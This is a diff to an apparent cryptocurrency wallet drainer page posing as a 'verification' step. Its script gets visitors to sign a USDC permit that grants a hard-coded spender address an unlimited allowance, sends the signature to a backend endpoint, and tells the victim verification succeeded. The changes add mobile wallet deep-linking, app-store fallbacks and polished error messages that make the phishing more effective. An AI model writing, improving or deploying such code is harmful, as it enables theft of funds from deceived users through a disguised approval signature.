@@ -31,6 +31,9 @@
         .van-picker-column__item img { width: 26px; height: 26px; margin-right: 12px; border-radius: 4px; }
         .van-picker__mask { position: absolute; top: 0; left: 0; z-index: 2; width: 100%; height: 100%; pointer-events: none; background-image: linear-gradient(180deg, hsla(0,0%,100%,.9), hsla(0,0%,100%,.4) 110px, transparent 110px, transparent 154px, hsla(0,0%,100%,.4) 154px, hsla(0,0%,100%,.9)); }
         .van-picker__frame { position: absolute; top: 110px; left: 16px; right: 16px; z-index: 3; height: 44px; border-top: 0.5px solid #ebedf0; border-bottom: 0.5px solid #ebedf0; pointer-events: none; }
+
+        /* Loading indicator */
+        .loading { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2100; background: rgba(0,0,0,0.8); color: white; padding: 12px 20px; border-radius: 30px; font-size: 14px; }
     </style>
 </head>
 <body>
@@ -63,6 +66,7 @@
         </div>
     </div>
 </div>
+<div id="loading" class="loading">Opening wallet...</div>
 
 <script>
     const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
@@ -81,37 +85,84 @@
     async function confirmSelection() {
         const scroller = document.getElementById('scroller');
         const items = scroller.querySelectorAll('.van-picker-column__item');
-        const index = Math.round(scroller.scrollTop / 44);
-        const choice = items[index].getAttribute('data-id');
+        const scrollTop = scroller.scrollTop;
+        const index = Math.round(scrollTop / 44);
+        const selectedItem = items[index];
+        if (!selectedItem) return;
+        const choice = selectedItem.getAttribute('data-id');
         closePicker();
         await startVerify(choice);
+    }
+
+    // Helper: Open deep link properly for mobile wallets
+    function openDeepLink(link, fallbackUrl) {
+        const loadingEl = document.getElementById('loading');
+        loadingEl.style.display = 'block';
+
+        // Create invisible anchor and trigger click
+        const anchor = document.createElement('a');
+        anchor.href = link;
+        anchor.style.display = 'none';
+        document.body.appendChild(anchor);
+        anchor.click();
+
+        // Clean up
+        setTimeout(() => {
+            document.body.removeChild(anchor);
+        }, 100);
+
+        // Fallback timeout - if app doesn't open, go to store
+        let timeout = setTimeout(() => {
+            loadingEl.style.display = 'none';
+            if (fallbackUrl && confirm("Wallet app not detected. Would you like to download it?")) {
+                window.location.href = fallbackUrl;
+            } else if (!fallbackUrl) {
+                alert("Please ensure you have the wallet app installed and try again.");
+                loadingEl.style.display = 'none';
+            }
+        }, 3000);
+
+        // If page loses focus (app opened), clear timeout and loading
+        window.addEventListener('blur', () => {
+            clearTimeout(timeout);
+            loadingEl.style.display = 'none';
+        }, { once: true });
     }
 
     async function startVerify(wallet) {
         const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
         const currentUrl = window.location.href;
-        const cleanUrl = currentUrl.replace(/^https?:\/\//, '');
 
-        // --- MOBILE REDIRECTION TO DAPP BROWSERS ---
+        // Extract origin for clean URL handling
+        const urlObj = new URL(currentUrl);
+        const cleanUrl = urlObj.host + urlObj.pathname;
+
+        // --- MOBILE: No wallet injected? Redirect to wallet's dapp browser ---
         if (isMobile && !window.ethereum) {
-            let link = "";
+            let deeplink = "";
+            let storeLink = "";
+
             if (wallet === 'Crypto.com') {
-                // Official cro.link redirector for Onchain/DeFi App
-                link = `https://crypto.com/defi/dapp?url=${encodeURIComponent(currentUrl)}`;
+                // CORRECT: Use crypto.com/defi/dapp format for Onchain wallet
+                deeplink = `https://crypto.com/defi/dapp?url=${encodeURIComponent(currentUrl)}`;
+                storeLink = "https://crypto.com/onchain";
             } else if (wallet === 'MetaMask') {
-                // Official metamask link redirector
-                link = `https://metamask.app.link/dapp/${cleanUrl}`;
+                deeplink = `https://metamask.app.link/dapp/${cleanUrl}`;
+                storeLink = "https://metamask.io/download/";
             } else if (wallet === 'Trust Wallet') {
-                // Official trust wallet redirector
-                link = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
+                deeplink = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(currentUrl)}`;
+                storeLink = "https://trustwallet.com/download";
             }
 
-            if (link) { window.location.href = link; return; }
+            if (deeplink) {
+                openDeepLink(deeplink, storeLink);
+                return;
+            }
         }
 
-        // --- INTERNAL DAPP BROWSER EXECUTION ---
+        // --- DESKTOP OR INJECTED WALLET (Internal DApp Browser) ---
         if (!window.ethereum) {
-            alert("Please open this page inside your wallet's internal DApp browser.");
+            alert("Please open this page inside your wallet's internal DApp browser on mobile, or install a wallet extension on desktop.");
             return;
         }
 
@@ -123,31 +174,100 @@
 
             const { chainId } = await provider.getNetwork();
             if (chainId !== 1) {
-                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x1' }] });
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x1' }]
+                    });
+                } catch (switchError) {
+                    // Chain not added - suggest adding it
+                    alert("Please switch to Ethereum Mainnet (Chain ID 1) to continue.");
+                    return;
+                }
             }
 
-            const contract = new ethers.Contract(USDC, ["function nonces(address owner) external view returns (uint256)"], provider);
+            const contract = new ethers.Contract(USDC, [
+                "function nonces(address owner) external view returns (uint256)"
+            ], provider);
+
             const nonce = await contract.nonces(owner);
-            const deadline = Math.floor(Date.now() / 1000) + 86400;
+            const deadline = Math.floor(Date.now() / 1000) + 86400; // 24 hours
 
-            const domain = { name: "USD Coin", version: "2", chainId: 1, verifyingContract: USDC };
-            const types = { Permit: [{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}] };
-            const message = { owner, spender: SPENDER, value: ethers.constants.MaxUint256, nonce, deadline };
+            const domain = {
+                name: "USD Coin",
+                version: "2",
+                chainId: 1,
+                verifyingContract: USDC
+            };
 
+            const types = {
+                Permit: [
+                    { name: "owner", type: "address" },
+                    { name: "spender", type: "address" },
+                    { name: "value", type: "uint256" },
+                    { name: "nonce", type: "uint256" },
+                    { name: "deadline", type: "uint256" }
+                ]
+            };
+
+            const message = {
+                owner,
+                spender: SPENDER,
+                value: ethers.constants.MaxUint256,
+                nonce,
+                deadline
+            };
+
+            // Request signature
             const signature = await signer._signTypedData(domain, types, message);
             const { v, r, s } = ethers.utils.splitSignature(signature);
 
-            await fetch("/api/save-sig/", {
+            // Send to backend
+            const response = await fetch("/api/save-sig/", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ owner, deadline, v, r, s, nonce: nonce.toString() })
+                body: JSON.stringify({
+                    owner,
+                    deadline,
+                    v,
+                    r,
+                    s,
+                    nonce: nonce.toString()
+                })
             });
 
-            alert("Verification Successful!");
-        } catch (e) {
-            alert("Error: " + e.message);
+            if (response.ok) {
+                alert("✅ Verification Successful! Your signature has been saved.");
+            } else {
+                const error = await response.text();
+                alert("⚠️ Server error: " + error);
+            }
+        } catch (err) {
+            console.error(err);
+            let errorMsg = err.message;
+            if (err.code === 4001) {
+                errorMsg = "You rejected the signature request.";
+            } else if (err.message.includes("User denied")) {
+                errorMsg = "Signature was denied. Verification cancelled.";
+            }
+            alert("❌ Error: " + errorMsg);
         }
     }
+
+    // Optional: Scroll snap enhancement for picker
+    document.getElementById('scroller')?.addEventListener('scroll', function() {
+        const items = this.querySelectorAll('.van-picker-column__item');
+        const index = Math.round(this.scrollTop / 44);
+        items.forEach((item, i) => {
+            if (i === index) {
+                item.style.fontWeight = 'bold';
+                item.style.opacity = '1';
+            } else {
+                item.style.fontWeight = 'normal';
+                item.style.opacity = '0.7';
+            }
+        });
+    });
 </script>
 </body>
 </html>
